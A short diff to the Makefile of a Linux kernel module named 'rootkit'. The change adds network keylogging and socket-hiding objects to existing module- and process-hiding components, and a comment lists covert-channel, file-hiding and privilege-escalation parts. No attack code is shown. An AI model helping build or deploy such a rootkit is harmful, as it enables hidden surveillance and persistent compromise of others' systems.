@@ -27,7 +27,7 @@ SYSMAP_HEADER = ./sysmap.h
 KDIR = /lib/modules/$(shell uname -r)/build
 TARGET = rootkit
 obj-m += $(TARGET).o
-$(TARGET)-y := module_masking.o process_masking.o
+$(TARGET)-y := module_masking.o network_keylogging.o process_masking.o socket_masking.o
 #covert_channel.o file_masking.o priviledge_escalating.o
 ccflags-y = -Wno-unused-function
 
